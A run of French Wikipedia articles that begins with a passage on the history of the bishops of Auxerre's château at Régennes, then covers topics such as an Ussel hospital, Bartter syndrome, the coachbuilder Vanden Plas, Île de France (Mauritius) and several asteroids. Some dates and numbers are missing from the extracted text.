Au début de 1358 les Anglais sont aux portes de la Bourgogne. Les habitants d'Appoigny veulent rétablir l'ancienne forteresse et ses fossés, autour de l'église et ailleurs ; mais cela ne peut se faire sans démolir l'auditoire du bailliage et d'autres bâtiments générateurs de revenu pour l'évêché. Ils demandent donc à Jean d'Auxois ( évêque d'Auxerre 1352-1358) la permission de les démolir et ce dernier la leur accorde le 6 juin 1358. Toutefois ils ne se sont pas engagés à les maintenir mais seulement à les creuser. Ils demandent donc au chapitre confirmation de cette autorisation, confirmation apportée le 8 juin deux jours après celle de Jean d'Auxois. Mais les Anglais se rapprochent de plus en plus. Jean d'Auxois quitte Régennes pour s'enfermer dans Auxerre. Régennes est pris le 8 décembre 1358. Le château est subséquemment utilisé comme garnison par les Anglais ; ils s'en servent comme base pour aller attaquer Auxerre, qui tombe dans leurs mains le 10 mars 1359, et y piller leur nourriture ultérieurement à cette prise. Ils commandent donc le pertuis sur la rivière Yonne mentionné plus haut. Les auxerrois, après la libération d'Auxerre, demandent au connétable Robert de Fienne d'intercéder auprès des Anglais basés à Régennes pour que ces derniers acceptent contre tribut le passage du vin par le si important pertuis de Régennes. L'accord passé inclut toutes marchandises, contre de larges quantités de vin prélevé au passage ; et inclut aussi la destruction par les anglo-gascons de la Motte Champlay à Tannerre, de Malicorne, de Ligny-le-Château et de Régennes lors du départ prévu de ces troupes. Il est aussi mention d'une intervention du pape Innocent II, qui a nommé Ithier de Jarousse évêque d'Auxerre (1359-1361) en succession de Jean d'Auxois († 19 janvier 1359) ; les Anglais ayant remis Régennes aux mains du roi, Innocent II œuvre pour que le château, ou ce qu'il en reste, soit rendu à l'évêque.
Durant l'épiscopat de Ferric Cassinel ( év. 1382-1390), l'avocat Étienne de Mailly, résident d'Auxerre et précédemment official d'Autun, plaide au siège d'Auxerre contre l'évêque en faveur de gens que l'évêque a injustement accusé, et publie un « "excomuniement" » requis par l'évêque de Lodève contre l'évêque d'Auxerre. Vexé, Ferric Cassinel fait emprisonner Étienne de Mailly à Régennes où Guillaume Cassinel frère de Ferric le fait torturer par deux de ses domestiques.
En 1361 Jean II le Bon (1350–1364) dîne à Régennes.
En 1423 du temps de l'évêque Philippe des Essarts, Régennes est très endommagé par les Anglais à l'occasion de la bataille de "Crevan" (Cravant, Yonne).
En 1432, François l'Aragonnais (1398–1462) et ses bourguignons attaquent le château avec l'artillerie d'Auxerre et le prennent. En 1492 il est assiégé puis entièrement détruit, toujours par des bourguignons mais ceux-là conduits par Jacques de Savoie. François de Dinteville ( év. 1513-1530) et son neveu François de Dinteville II ( év. 1530-1554) le reconstruisent.
Temps modernes.
Le château a été détruit par les guerres du entre le duc de Bourgogne et le roi de France, ainsi que nombre de maisons rasées ou inhabitées. Le revenu de la terre en est donc considérablement diminué. Jean Baillet ( évêque d'Auxerre 1477-1513), quatre mois après le début de son épiscopat, signe un accord le 5 janvier 1478 avec le chapitre des chanoines d'Auxerre pour réduire à la somme de due annuellement par l'évêché au chapitre, réduction validée pour une durée de six ans. En 1486 le chapitre, reconnaissant des bonnes œuvres de Baillet, lui accorde cette remise à vie.
Le cardinal Robert de Lenoncourt (év. 1556-1560) ne réside que très peu au palais d'Auxerre ; presque tous les actes portant son nom sont signés de Régennes ou de La Charité-sur-Loire - quand il n'est pas retenu hors du diocèse par ses autres charges, ce qui est fréquent. Le premier portique d'entrée du château portait ses armoiries et une partie du corps de logis de la première cour date probablement de son époque.
En 1563, Charles IX (1560-1574) dîne à Régennes.
En avril 1568 sous l'épiscopat de La Bourdaisière ( év. 1563-1570), les catholiques chassent d'Auxerre les huguenots qui avaient pris la ville le 27 septembre 1567. Ceux-ci se rabattent sur Régennes et gagnent finalement accès au château par traîtrise le 3 août 1568. Les auxerrois, en peine de cette perte, demandent de l'aide à plusieurs villes du diocèse (Tonnerre, Joigny, Seignelay, Chablis...) La plus proche de Régennes est Seignelay, et De Malain, seigneur d'une partie de Seignelay, est le seul à proposer son aide : il offre son artillerie et il avertit Auxerre de ce que les huguenots de Régennes attendent des troupes de renfort et des échelles, fabriquées à Coulanges-sur-Yonne, pour investir la ville de nuit. Il se joint aux troupes envoyées rapidement par le roi et qui reprennent Régennes le 24 août 1568, seulement 20 jours après sa prise par l'arrivée des huguenots au château. Pour cette contre-attaque, l'infanterie catholique aborde en amont de Régennes des trains de bois mentionnées ici plus haut (voir # Le pertuis de Régennes), et débarque à hauteur du château. Ce sont les troupes royales qui mettent le feu au château pour en débusquer les huguenots.
Jacques Amyot ( év. 1570-1593) rebâtit Régennes en 1576 à l'identique.
En 1615, le prince de Condé, en révolte contre Concini, s'est fait porte-parole des protestants. Ses soldats et ceux de Dumaines, du maréchal de Bouillon et du prince de Tingry s'emparent d'Appoigny et prennent Régennes par surprise - ils rendent le château à l'évêque François de Donadieu contre .
Dominique Séguier (év. 1631-1637) aime Régennes plus que tout autre de ses demeures épiscopales. Il renouvelle et augmente les allées d'arbres plantées par son prédécesseur, fait élargir le fossé de l'entrée, fait faire des passages de communication entre les chambres du rez-de-chaussée et le jardin, et fait remettre en état l'appartement bâti par le cardinal Robert de Lenoncourt (1556-1560).
Les trois derniers évêques d'Auxerre : Charles de Caylus (év. 1705-1754), Jacques-Marie de Condorcet (év. 1754-1760) et, et tout dernier évêque d'Auxerre, Champion de Cicé (év. 1760-1801), abandonnent le palais d'Auxerre et se logent à Régennes. 
Champion de Cicé fait rebâtir Régennes en 1769, sur deux étages dans un style moderne et avec beaucoup de magnificence ; l'architecte en est Claude Louis d'Aviler († 1764). Il fait remanier le parc selon des plans d'André Le Nôtre, ce qui fait appeler Régennes « "l'île enchantée" ». Il y reçoit le futur Louis XVIII (1814-1824), qui couche à Régennes en 1778.
En 1768, du temps de Champion de Cicé, le seigneur a droit de haute, moyenne et basse justice ; il a droit d'assises - qui se tenaient vers la saint-Pierre (29 juin), droit d'amende ( pour les appels et pour chaque défaut donné par le juge), droits de greffe, de sergenterie, de notariat et de tabellionage, droit de prévôté des amendes, droit de prison et de geôlage ; droit de chasse, droit de pêche dans l'Yonne ; droit de guet (en temps de guerre les habitants doivent fournir 8 hommes nuit et jour pour la garde du château de Régennes) ; droits de censive, d'amende de recelé, de profit de lods et de ventes sur tous les héritages situés sur le territoire de la justice d'Appoigny ; droit de taille bourgeoise ; droit de dîme sur tous les fruits naturels, blé, vin, grain, légumes et sur les porcs, veaux, agneaux et sur la laine ; droit de corvée ( jours / personne / an) ; droit de rouage, droits de port et de passage sur l'Yonne ; droits de marché, de halage, de jeu de quilles ; droits de ban, de vendange, de courtiers de vin, de four banal, de boulangerie, de boucherie banale, etc.
Les effets du château sont vendus en 1795.
Dans l'église Saint-Martial de Seignelay, un médaillon en marbre blanc qui représente la Religion tenant une croix ou des anges portant les instruments de la Passion, dans le style du , provient du château de Regennes et a été donné par le curé Berlie. Dans les années 1830, son pendant est à l'hôtel de ville d'Auxerre.

</doc>
<doc id="10578474" url="https://fr.wikipedia.org/wiki?curid=10578474" title="Centre hospitalier de Haute-Corrèze">
Centre hospitalier de Haute-Corrèze

Le centre hospitalier de Haute-Corrèze est un centre hospitalier public situé à Ussel, dans le département de la Corrèze.
Description.
Situation géographique.
Le centre hospitalier est un établissement public de santé, autonome, situé à Ussel en Corrèze. Il couvre une zone géographique comprenant la Haute-Corrèze, le nord-ouest du Cantal, le sud-ouest du Puy-de-Dôme et le sud-est de la Creuse. C'est le seul hôpital qui dispose d'un service d'urgence et d'une maternité à plus de à la ronde. Le centre hospitalier de Haute-Corrèze gère aussi celui de Bort-les-Orgues et d'Eygurande.
Nombre d'entrées.
 ont été enregistrées durant l’année 2017, en baisse d'environ par rapport à l'année précédente.
Activités médicales et enseignement.
Les différents services.
Le centre hospitalier de Haute-Corrèze dispense les spécialités médicales et chirurgicales suivantes :
Maternité.
Une fermeture de la maternité a souvent été évoquée, à cause d'une baisse des naissances à Ussel. En effet en 1964, un pic de naissance à 402 était atteint contre 192 en 2016. Mais il est inconcevable pour l'agence régionale de santé de fermer la structure. En 2017, la maternité d’Ussel a enregistré six naissances de plus qu’en 2016, soit 202 accouchements.
Formation.
Le CHHC dispose d’un institut de formation d'aides-soignants (IFAS) et d’un Institut de formation en soins infirmiers (IFSI).
Histoire.
L'inauguration.
Le , Simone Veil inaugure, en compagnie de Jacques Chirac, alors Premier ministre du gouvernement de Valéry Giscard d'Estaing, le centre hospitalier d'Ussel.
Crise du Covid-19.
Lors de la pandémie du Covid-19, le centre hospitalier de Haute-Corrèze crée une unité d'hospitalisation pour les malades au sein du service de cardiologie, destiné à accueillir des patients Covid19 si les établissements référents de Brive et Tulle étaient en situation de saturation. L’établissement de première ligne est le CHU de Limoges, les établissements de ligne identifiés en Corrèze sont le centre hospitalier de Brive, le centre hospitalier de Tulle, et le Centre médico chirurgical Les Cèdres à Brive. Les patients suspectés d’être porteurs du virus sont diagnostiqués par un prélèvement pharyngé pour effectuer une recherche par PCR au CHU de Limoges. Le prélèvement est réalisé par un détachement mobile du centre hospitalier de Tulle sur le site de l’hôpital d’Ussel. Un scanner peut également être indiqué. Les patients Covid positifs ayant une indication hospitalière doivent ensuite être transférés dans les établissements référents du département conformément aux recommandations de l’ARS Nouvelle-Aquitaine.

</doc>
<doc id="10578475" url="https://fr.wikipedia.org/wiki?curid=10578475" title="Oratoire Santa Maria della Fede">
Oratoire Santa Maria della Fede

L'oratoire Santa Maria della Fede (Sainte-Marie-de-la-Foi) est un oratoire situé à Naples via Pallonetto a Santa Chiara. L'ensemble auquel il appartient est parfois nommé par les Napolitains "" (palais des petites vieilles).
Histoire et description.
L'oratoire fait partie d'un ensemble architectural entièrement reconstruit vers 1700 à l'emplacement d'un ancien édifice du XVIe siècle. L'oratoire appartient à un édifice qui était destiné à accueillir des (c'est-à-dire des femmes de mauvaise vie) selon la volonté de la reine Marie-Amélie. La maison devient ensuite un hospice féminin, puis une maison d'accueil de femmes âgées.
La façade donnant via Pallonetto a Santa Chiara est caractérisée par des fenêtres encadrées simplement en piperno et se termine par une corniche de cette même pierre volcanique. Le portail de l'église-oratoire donnant via San Giovanni Maggiore Pignatelli, est en piperno : il présente une décoration de marbre remarquable et il est surmonté d'un oculus de stuc.
Au numéro 5 de cette rue, l'on remarque une belle voûte du siècle disposée en exèdre.
La maison après avoir été divisée en appartements privés a été livrée à l'abandon pendant plusieurs décennies. L'ensemble est en cours de restauration et a ouvert au public en 2015, tandis qu'un concert de musique classique et une exposition d'artisanat ont ouvert les festivités.
Il est aujourd'hui géré par un collectif d'associations culturelles et citoyennes (Santa Maria Liberata).

</doc>
<doc id="10578486" url="https://fr.wikipedia.org/wiki?curid=10578486" title="Syndrome de Bartter">
Syndrome de Bartter

Le syndrome de Bartter est une maladie rare affectant l'anse de Henle, partie du néphron. La maladie se caractérise par une alcalose hypokaliémique (baisse du taux potassium sanguin), des taux élevés de rénine et d'aldostérone dans le plasma sanguin, une faible pression sanguine et une résistance vasculaire à l'angiotensine II.
Description.
Le syndrome de Bartter devient apparent avant la naissance, causant une augmentation du liquide amniotique, ce qui accroît le risque de naissance prématurée. Les personnes avec cette condition ne parviennent souvent pas à croître et à prendre du poids au rythme attendu. Elles perdent un montant élevé de chlorure de sodium dans leur urine, causant une déshydratation, de la constipation et une production élevée d'urine. Elles sont souvent aussi à risque d'ostéoporose causé par la perte importante de calcium dans leur urine, qui se dépose dans les reins, causant un durcicement des tissus renaux. La baisse du potassium sanguin peut causer fatigue, faiblesse et crampes musculaires. Aussi, les jeunes atteints de la maladie peuvent développer des troubles d'ouïe causés par un développement anormal de la structure des oreilles.
La maladie est premièrement décrite en 1962 par Frederic Bartter et ses collègues dans un papier portant sur la condition de deux patients.

</doc>
<doc id="10578487" url="https://fr.wikipedia.org/wiki?curid=10578487" title="André Paul Clavaud">
André Paul Clavaud

André Paul Clavaud, né le à Angoulême et mort le à Toulon, est un officier de marine français.
Biographie.
Élève du Collège de la marine d'Angoulême (), de classe () puis de (), il participe à la campagne d'Espagne sur la "Magicienne" et le "Santi-Pietri". 
Enseigne de vaisseau (), il sert sur la frégate "Cybèle" pendant la prise d'Alger (1830) et est promu lieutenant de vaisseau en octobre. Il participe alors à des campagnes en Méditerranée puis commande le pendant l'expédition du Mexique de 1838.
Capitaine de corvette (), il est sur le en escadre de Méditerranée avant d'être nommé capitaine de vaisseau en et de commander le "Volage" dans l'escadre du prince de Joinville durant le bombardement de Mogador. 
En 1848-1849, il commande le vaisseau en escadre de Méditerranée puis entre en au Conseil d'amirauté. Commandant de la corvette à vapeur "Véloce" et de la station de Terre-Neuve (1852-1853), il devient ensuite chef d'état-major, sur l' "Inflexible", de l'amiral Parseval-Deschênes pendant la campagne de la Baltique (1854). 
Contre-amiral (), major général à Toulon (1855-1857), il prend part à la guerre d'Italie sur le (1859) et est promu vice-amiral en . 
Préfet maritime de Cherbourg (1861-1863) puis de Toulon (1863-1864), il prend sa retraite en .

</doc>
<doc id="10578494" url="https://fr.wikipedia.org/wiki?curid=10578494" title="Équipe cycliste Aubervilliers 93-Peugeot">
Équipe cycliste Aubervilliers 93-Peugeot



</doc>
<doc id="10578495" url="https://fr.wikipedia.org/wiki?curid=10578495" title="Haejangguk">
Haejangguk

Le terme haejangguk désigne en coréen différentes soupes ("guk"), supposées soigner la gueule de bois. "Haejangguk" (해장국 ; parfois sulguk ; 술국) signifie littéralement « soupe pour chasser la gueule de bois ». Elle consiste généralement en chou chinois séché, légumes et viande cuits dans un bouillon de bœuf. Le "seonjiguk", une variété de "haejangguk", inclut du sang de bœuf congelé coupé en tranches ; le "sundaeguk" inclut une sorte de boudin au sang de porc.
Histoire.
Dans le "Nogeoldae", un manuel pour l'apprentissage du chinois publié sous la dynastie Goryeo (918-1392), le terme "seongjutang" (en chinois : 醒酒湯) apparaît ; il signifie « soupe pour redevenir sobre » et serait à l'origine du "haejangguk". D'après cet ouvrage, la soupe en question contient de la viande en tranches fines, des nouilles, des cébettes et du poivre du Sichuan dans un bouillon, une recette très proche du "haejangguk" actuel.
Le "haejangguk" n'est pas mentionné pendant la période Joseon (1392-1910), mais des tableaux et des documents de la période Joseon tardive le représentent sans doute. Le tableau de Hyewon, intitulé "Jumakdo" (주막도, "Tableau de la Taverne"), représente un groupe de jeunes gens mangeant du "haejangguk" pendant que la tenancière de la taverne fait bouillir de la soupe dans un chaudron.
Variantes.
La recette du "haejangguk" varie d'une région à l'autre. Le "heajangguk" de la région de Séoul est une sorte de "tojangguk" (soupe de pâte de soja) préparé à partir de "kongnamul", de radis, de chou chinois, de cébette, de sang de bœuf coagulé et de bouillon à la pâte de soja fermentée ("doenjang"). Le bouillon est préparé en faisant mijoter des os de bœuf dans l'eau pendant plusieurs heures. Le quartier de Cheongjin-dong est particulièrement réputé pour son "haejangguk".

</doc>
<doc id="10578503" url="https://fr.wikipedia.org/wiki?curid=10578503" title="Jack Sepkoski">
Jack Sepkoski

J. John Sepkoski Jr. ( - ) est un paléontologue américain de l'université de Chicago.
Travaux.
Durant toute sa carrière Sepkoski a étudié les fossiles et la biodiversité sur Terre. Sepkoski est surtout connu pour sa publication en 2002, après sa mort, avec David Raup, d'une compilation sur les organismes fossiles marins. Ce travail les a conduit à définir différents événements d'extinction ou crise biologique dont cinq épisodes d'extinction massive au cours des temps géologiques.
Dans cet ouvrage, ils suggèrent que l'extinction Crétacé-Tertiaire intervenue il y a environ (millions d'années), et responsable entre autres de la disparition des dinosaures non aviens, serait liée à des cycles d'extinction d'une période de .
Hommage.
Un astéroïde de la ceinture principale a été nommé (7173) Sepkoski en son honneur en 1988.
Bibliographie.
Parmi ses publications :

</doc>
<doc id="10578507" url="https://fr.wikipedia.org/wiki?curid=10578507" title="Vanden Plas (carrossier)">
Vanden Plas (carrossier)

Vanden Plas est le nom d'un carrossier anglais ayant notamment produit des versions de luxe d’automobiles de série. Le nom finit également par servir d’appellation commerciale aux finitions haut de gamme de modèles du groupe British Leyland (devenu par la suite Austin Rover, Rover Group et MG Rover). Son dernier usage remonte à 2003, sur la version rallongée de la Rover 75.
La Belgique et l'Angleterre.
Carrosserie par lot et sur mesure.
L'entreprise a commencé en 1870, à Bruxelles, en Belgique, en tant que Carrosserie Van den Plas, faisant d'abord des essieux avant de produire des chariots tirés par des chevaux. Elle a été fondée par Guillaume van den Plas, un forgeron, et ses trois fils, Antoine, Henri et Willy qui créeront une succursale à Paris. En 1884, ils ont déménagé de Bruxelles à Anvers. Avec l'augmentation de la demande, ils ont ouvert une succursale à Bruxelles en 1890. Vers 1900, l'entreprise travaillait avec De Dion Bouton, Berlier, Germain, Packard. En 1908, Vanden Plas avait un effectif de 400 hommes à la production de 300 carrosseries spéciales par an, rapidement portée à plus de 750. La branche française a cessé sa production en 1934, tandis que l'entreprise Belge a cessé sa production en 1949.
Le nom du carrossier est apparu au Royaume-Uni en 1906, lorsque des véhicules Métallurgique furent importés avec des carrosseries Vanden Plas. La première société Vanden Plas d'Angleterre a été établie par Warwick Wright (maintenant revendeurs Peugeot) en 1913, construisant des carrosseries sous licence Vanden Plas Belgique.
Au cours de la première Guerre Mondiale les activités au Royaume-Uni sont passées à la production d'aéronefs et l'entreprise a été achetée par l' Aircraft Manufacturing Company qui était basée à Hendon , près de Londres. En 1917, la société Vanden Plas (1917) Ltd., a été constituée. Après la guerre, elle semble avoir eu d'énormes difficultés pour se remettre dans la carrosserie et en 1922, la société a été placée en liquidation judiciaire. Les droits exclusifs du nom pour le Royaume-Uni semblent avoir été perdus au début des années 1920, la firme Belge exposant au aux côtés de la firme Britannique. En 1923, les droits sur le nom et le goodwill ont été achetés par les frères Fox qui ont fondé Vanden Plas (Angleterre) 1923 Limited. Ils ont déménagé l'entreprise de Hendon à Kingsbury et élaboré les contacts pris avec Bentley. Entre 1924 et 1931, lorsque Bentley tomba à son tour, Vanden Plas avait construit des carrosseries sur plus de 700 de leur châssis.
Survivre dans les années 1930 impliquait de devenir moins dépendant d'un constructeur automobile et l'entreprise fournit des carrosserie pour Alvis, Armstrong Siddeley, Bentley, Daimler, Lagonda, Rolls-Royce et Talbot. La société a également mis à jour ses méthodes de production se mit à fabriquer de petites séries. Avec le déclenchement de la guerre en 1939, la société est retournée à la production d'avions, et la carrosserie fut de nouveau arrêtée. Pendant la Guerre, la société a fabriqué la structure en bois pour le De Havilland Mosquito, un des avions au plus grands succès de la seconde Guerre Mondiale. Après la guerre, la société a poursuivi son association avec la société De Havilland et produisit des pièces pour le DH Vampire, un jet de combat.
La Production de limousines.
La Princess.
Avec la paix en 1945, la société a cherché à reprendre ses anciennes productions quand un nouveau client est apparu. Austin voulait mettre sur le marché une version avec chauffeur de sa grande de la taille des Rolls-Royce, la voiture de luxe A110 Sheerline et s'est approché de Vanden Plas. Vanden Plas est devenu une filiale d'Austin Motor Company en 1946 et produisit le modèle Austin A120 Princess sur base du châssis Austin Sheerline.
À partir de 1958, cela a également commencé à impliquer l'assemblage du châssis et la direction d'Austin (maintenant BMC) reconnut Vanden Plas comme fabricant de voitures à part entière, abandonnant le nom Austin, de sorte que la Princess puisse être vendue par les revendeurs Nuffield. En 1960, la Princess est devenue la Vanden Plas Princess.
Daimler DS 420.
Austin a été rejoint dans BMC par Jaguar avec sa nouvelle filiale Daimler. La Production des limousines Princess se termine en 1968, lorsqu'elles sont remplacées par des limousines (Jaguar avait acquis Daimler en 1960) construites par Vanden Plas sur un châssis de Jaguar Mark X allongé. La DS420 a été produite à l'usine Vanden Plas de Kingsbury Lane jusqu'à sa fermeture en .
Le conseil d'administration du holding British Leyland a décidé en 1967 qu'il n'y avait pas suffisamment de fonds dans le budget de publicité du groupe pour affronter la commercialisation en Amérique du Nord des marques Daimler ainsi que Jaguar. Cette décision a été modifiée par après, mais Vanden Plas est utilisée en Amérique du Nord au lieu de Daimler sur les meilleurs modèles Jaguar de luxe. La propriété du nom Vanden Plas est resté dans le , et lorsque Rover a été vendu, Jaguar a été obligé d'arrêter d'employer le nom de Vanden Plas au Royaume-Uni bien qu'elle continua de le faire en Amérique. Au Royaume-Uni, la Daimler Double-Six Vanden Plas devint une Daimler Double-Six.
Ingénierie de Marque.
Également en 1957/8, Leonard Lord demanda à Vanden Plas d'ajouter des accessoires de luxe sur une série d'Austin A105 Westminster, entamant par là la pratique d'employer les compétences et le nom de la société pour produire des versions de luxe (véritablement améliorées) de la plupart des véhicules BMC (et, plus tard, British Leyland (BL)), comme la gamme 1100/1300 et l'Allegro (connue sous le nom de Vanden Plas 1500, 1.5 et 1.7 entre 1975 et 1980).
De 1982 à 1989, fait des modèles haut de gamme Vanden Plas pour ses séries Metro, Maestro, Montego et Rover SD1 et SD3.
Le nom est également utilisé en Amérique du Nord sur les voitures Jaguar commercialisées comme des Daimler dans les autres marchés.
En 1992, une entreprise japonaise recrée le look Vanden Plas 1100/1300 sur la Nissan Micra K11. Cela impliqua la réplication de l'avant et à l'arrière de la Vanden Plas, avec une peinture deux tons comme arborée par le modèle original des années 1960.
La dernière voiture à porter le nom Vanden Plas sur le marché britannique était la Rover 75 au début du .
La Chine.
Les droits de la conception de la Rover 75 et le groupe MG (qui avait été jadis MG Rover) ont été achetées par une société chinoise, la Nanjing Automobile. En 2006, Ford a acheté les droits d'utilisation du nom Rover au précédent propriétaire BMW pour protéger la marque Land Rover de Shanghai Automotive qui voulait le nom Rover pour la 75 (Ford était à cette époque le propriétaire de Land Rover et Jaguar). Le nom Vanden Plas (en dehors de l'Amérique du Nord) et de nombreux autres noms du groupe Leyland ont été achetés par Nanjing Automobile.

</doc>
<doc id="10578508" url="https://fr.wikipedia.org/wiki?curid=10578508" title="Clavaud">
Clavaud



</doc>
<doc id="10578509" url="https://fr.wikipedia.org/wiki?curid=10578509" title="C9H8">
C9H8



</doc>
<doc id="10578511" url="https://fr.wikipedia.org/wiki?curid=10578511" title="Phare de Ballagh Rocks">
Phare de Ballagh Rocks

Le phare de Ballagh Rocks est un petit phare situé sur l'Îlot "Ballagh Rock" (ou "Carraig un Bealach") proche de l'île d'Arranmore au large de Leabgarrow dans le Comté de Donegal (Irlande). Il est géré par les Commissioners of Irish Lights (CIL).
Histoire.
&lt;mapframe zoom=16 latitude =54.999 longitude =-8.481 align=left width=250 height=250 text="Carte interactive du phare de Ballagh Rocks"&gt;{
 "type": "FeatureCollection",
 "features": [
 "type": "Feature",
 "properties": {
 "marker-color": "#ff8040",
 "marker-size": "medium",
 "marker-symbol": "lighthouse"
 "geometry": {
 "type": "Point",
 "coordinates": [
 -8.481,
 54.999
 ]
}&lt;/mapframe&gt;
Une première balise de 9 m a été érigée en 1875 sur cet emplacement, en pierre et peinte en blanc. Une bande noire a été ajoutée en 1926.
En 1982, il lui a été ajouté la lanterne avec une échelle d'accès, un local pour l'alimentation au gaz propane, un embarcadère et un chemin d'accès. Il a été converti à l'électricité en 1983. Le phare est situé à l'extrémité nord du canal entre l'île d'Arramore et le continent, 800 m environ au nord-est du village de Leabgarrow. Le phare est peint en blanc avec une bande horizontale noire. La lumière est sur la pointe de l'édifice et émet un flash blanc toutes les 2,5 secondes. L'installation n'est accessible qu'en bateau.

</doc>
<doc id="10578512" url="https://fr.wikipedia.org/wiki?curid=10578512" title="Île de France (Maurice)">
Île de France (Maurice)

L’île de France, autrefois orthographiée isle de France, était le nom de l'île Maurice dans l'océan Indien jusqu'en 1810, ainsi que la colonie établie par le Royaume de France au cours du . Administrée par la Compagnie française des Indes orientales, elle faisait partie du premier empire colonial français. En raison de sa beauté et de sa position stratégique, l’île était surnommée « l'étoile et la clé » de l’océan Indien, d'où sa devise actuelle.
Histoire.
L'île, déjà connue des navigateurs arabes du Moyen Âge, est reconnue par la flotte portugaise d'Afonso de Albuquerque au début du . En 1598, l'amiral néerlandais Wijbrand Van Warwijck en prend possession et la baptise « Mauritius » en l'honneur du stathouder des Pays-Bas, Maurice de Nassau. Les Néerlandais y développent vers 1641 le commerce des esclaves en provenance de Madagascar. Mais, après la fondation d'une nouvelle colonie au cap de Bonne-Espérance, l'île est abandonnée en 1710.
Elle reste déserte durant cinq ans. Le , au cours de la troisième expédition de Moka, Guillaume Dufresne d'Arsel prend possession, au nom du roi de France, de l'île Maurice, rebaptisée à cette occasion l'« isle de France ». Les Français occupent également les îles éparses de Maurice (Mascareignes, Archipel des Chagos, Saint-Brandon, Île Tromelin).
La Révolution française a pour conséquence l'arrivée de nombreux négociants de Lorient, des familles de l'ancienne bourgeoisie et des aristocrates fuyant la Terreur qui sévit en France.
À la suite de la campagne militaire menée par les Britanniques dans l'océan Indien au cours de la cinquième coalition, l'ensemble des territoires français de cette zone géographique passe sous le contrôle de la couronne britannique en 1810. L'île Bourbon est toutefois rétrocédée en 1814.

</doc>
<doc id="10578523" url="https://fr.wikipedia.org/wiki?curid=10578523" title="Dangal (film)">
Dangal (film)

Dangal () est un film dramatique biographique sportif indien, produit et réalisé par Nitesh Tiwari, sorti en 2016.
Le film est basé sur l'histoire vraie de Mahavir Singh Phogat, qui a enseigné la lutte à ses filles Geeta Phogat (première lutteuse indienne à remporter une médaille d'or chez les moins de 55 kg lors des Jeux du Commonwealth en 2010) et Babita Kumari (qui a remporté une médaille d'argent chez les moins de 51 kg).
Synopsis.
Mahavir Singh Phogat rêvait d'être lutteur professionnel et de remporter une médaille d'or pour l'Inde, mais a été contraint d'arrêter. Il place alors tous ses espoirs sur le fils qu'il aimerait avoir. Après la naissance de sa quatrième fille, il baisse les bras. Un jour, une mère vient se plaindre que ses fils ont été passés à tabac par les deux filles aînées de Phogat. Il découvre alors chez elles l'amour du combat, et décide de les entraîner à son sport de prédilection.
Le film retrace les obstacles et les étapes de l'ascension de la fille aînée, Geeta, jusqu'à la médaille d'or mondiale plusieurs années plus tard.
Autour du film.
Le , après 3 jours en salles le film récolte 106,95 crore roupies, se hissant parmi les films les plus rentables du cinéma bollywoodien.
Bande originale.
La bande originale est composée par Pritam. Elle comprend huit chansons, écrites par Amitabh Bhattacharya.

</doc>
<doc id="10578562" url="https://fr.wikipedia.org/wiki?curid=10578562" title="Défi 9">
Défi 9



</doc>
<doc id="10578572" url="https://fr.wikipedia.org/wiki?curid=10578572" title="Megan Miranda">
Megan Miranda

Megan Miranda est une femme de lettres américaine, auteure de récits appartenant aux genres du roman policier ou du fantasy, et principalement destinés à la jeunesse.
Biographie.
Megan Miranda fait des études au Massachusetts Institute of Technology, où elle obtient un diplôme de biologie.
Elle obtient un succès international avec "Fracture" (2011), œuvre de littérature d'enfance et de jeunesse se présentant comme un roman policier à la limite du fantastique, qui raconte les aventures de la jeune Delaney Maxwell qui, après avoir été rescapée d'un noyade, se découvre des capacités surnaturelles de prédire la mort.
En 2016, elle fait paraître "Évanouies" ("All the Missing Girls"), son premier roman policier pour adultes.

</doc>
<doc id="10578581" url="https://fr.wikipedia.org/wiki?curid=10578581" title="Wilmer Bravo">
Wilmer Bravo



</doc>
<doc id="10578589" url="https://fr.wikipedia.org/wiki?curid=10578589" title="Riebeek-Kasteel">
Riebeek-Kasteel

Riebeek-Kasteel est une petite ville de la région du Swartland, dans la province du Cap-Occidental en Afrique du Sud située à de Riebeek West et à au nord-est du Cap .
Histoire.
La région, explorée par les européens dès le , fut habitée par les Boers dès le début du . Le village de Riebeek-Kasteel fut fondé en 1858 et baptisé en hommage à Jan van Riebeeck, l'ancien commandeur du Cap.
Économie.
La vallée de Riebeek est connue pour ses productions agricoles (blé, olives) et pour ses vins, s'incluant dans le vignoble du Swartland. Le tourisme est basé sur la gastronomie et l’œnotourisme. Riebeek-Kasteel possède plusieurs chambres d'hôtes, un hôtel (Royal Hotel), des restaurants (Mama Cucina, Beans About Coffee, Red Tin Roof, Café Felix, et Eve's Eatery), et un bar à vin (The Alchemist).
La ville accueille annuellement un festival de l'olive en mai.
Population.
Les deux localités de Riebeek West et Riebeek-Kasteel comptent à elles seules un total de habitants dont pour Riebeek-Kasteel et pour Riebeek West.
La langue maternelle principale de la population est majoritairement l’Afrikaans :

</doc>
<doc id="10578595" url="https://fr.wikipedia.org/wiki?curid=10578595" title="(100433) Hyakusyuko">
(100433) Hyakusyuko

(100433) Hyakusyuko est un astéroïde de la ceinture principale.
Description.
(100433) Hyakusyuko est un astéroïde de la ceinture principale. Il fut découvert le à Nanyo par Tomimaru Okuni. Il présente une orbite caractérisée par un demi-grand axe de 2,58 UA, une excentricité de 0,34 et une inclinaison de 8,8° par rapport à l'écliptique.

</doc>
<doc id="10578597" url="https://fr.wikipedia.org/wiki?curid=10578597" title="(100732) Blankavalois">
(100732) Blankavalois

(100732) Blankavalois est un astéroïde de la ceinture principale.
Description.
(100732) Blankavalois est un astéroïde de la ceinture principale. Il fut découvert le à l'Observatoire Kleť par Miloš Tichý. Il présente une orbite caractérisée par un demi-grand axe de 2,65 UA, une excentricité de 0,12 et une inclinaison de 14,1° par rapport à l'écliptique.
Il est nommé d'après Blanche de Valois.

</doc>
<doc id="10578598" url="https://fr.wikipedia.org/wiki?curid=10578598" title="(100733) Annafalcká">
(100733) Annafalcká

(100733) Annafalcká est un astéroïde de la ceinture principale.
Description.
(100733) Annafalcká est un astéroïde de la ceinture principale. Il fut découvert le à l'Observatoire Kleť par Miloš Tichý. Il présente une orbite caractérisée par un demi-grand axe de 2,30 UA, une excentricité de 0,10 et une inclinaison de 6,2° par rapport à l'écliptique.
Il est nommé d'après Anne du Palatinat.

</doc>
<doc id="10578599" url="https://fr.wikipedia.org/wiki?curid=10578599" title="(100734) Annasvídnická">
(100734) Annasvídnická

(100734) Annasvídnická est un astéroïde de la ceinture principale.
Description.
(100734) Annasvídnická est un astéroïde de la ceinture principale. Il fut découvert le à l'Observatoire Kleť par Miloš Tichý. Il présente une orbite caractérisée par un demi-grand axe de 3,10 UA, une excentricité de 0,17 et une inclinaison de 2,3° par rapport à l'écliptique.
Il est nommé d'après Anne de Schweidnitz.

</doc>
